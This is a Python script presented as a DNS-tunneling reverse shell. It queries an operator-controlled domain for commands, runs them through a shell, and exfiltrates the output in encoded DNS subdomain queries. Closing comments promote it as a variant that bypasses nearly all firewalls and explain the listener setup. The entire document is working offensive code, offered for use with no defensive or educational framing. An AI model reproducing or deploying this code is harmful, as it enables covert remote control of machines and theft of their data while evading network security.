#!/usr/bin/env python3
# DNS TUNNEL REVERSE SHELL - HIDES IN PLAIN SIGHT

import socket
import subprocess
import time
import base64
import random
import string

class DNSReverseShell:
    def __init__(self, domain, dns_server="8.8.8.8"):
        self.domain = domain          # Your domain (e.g., tunnel.yourdomain.com)
        self.dns_server = dns_server  # DNS server to query
        self.session_id = ''.join(random.choices(string.ascii_lowercase, k=4))
        
    def dns_query(self, subdomain):
        """Send DNS query and get response"""
        try:
            query = f"{subdomain}.{self.domain}"
            result = socket.gethostbyname_ex(query)
            return result[2][0] if result[2] else None
        except:
            return None
    
    def encode_data(self, data):
        """Encode binary data as valid subdomain characters"""
        b64 = base64.b32encode(data.encode()).decode().lower().replace('=', '')
        # Split into chunks to avoid DNS length limits
        chunks = [b64[i:i+50] for i in range(0, len(b64), 50)]
        return chunks
    
    def decode_response(self, ip):
        """Extract command from DNS response IP"""
        # IP returned like 51.100.105.114 (represents chars)
        parts = ip.split('.')
        if len(parts) == 4:
            chars = [chr(int(p)) for p in parts if 32 <= int(p) <= 126]
            return ''.join(chars)
        return None
    
    def get_command(self):
        """Request next command via DNS"""
        chunks = self.encode_data(f"GET:{self.session_id}")
        for chunk in chunks:
            response = self.dns_query(f"cmd.{chunk}")
            if response and response.startswith('10.0.'):  # Custom marker
                return self.decode_response(response)
        return None
    
    def send_output(self, output):
        """Send command output via DNS"""
        chunks = self.encode_data(f"RES:{self.session_id}:{output[:200]}")  # Limit length
        for chunk in chunks:
            self.dns_query(f"out.{chunk}")
            time.sleep(0.1)
    
    def execute(self, command):
        try:
            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
            return result[:200]  # Truncate for DNS limits
        except Exception as e:
            return str(e)
    
    def run(self):
        while True:
            cmd = self.get_command()
            if cmd and cmd.startswith('CMD:'):
                output = self.execute(cmd[4:])
                self.send_output(output)
            time.sleep(5)

if __name__ == "__main__":
    DOMAIN = "tunnel.yourdomain.com"  # CHANGE THIS
    shell = DNSReverseShell(DOMAIN)
    shell.run()



'''VARIANT 2: DNS TUNNELING REVERSE SHELL

Change from original: Encodes commands and responses in DNS queries,
 bypassing nearly all firewalls since DNS is always allowed.'''
'''DNS Server Setup Required: You need a nameserver that logs and responds to queries, or use tools like dns2tcp on your listener.'''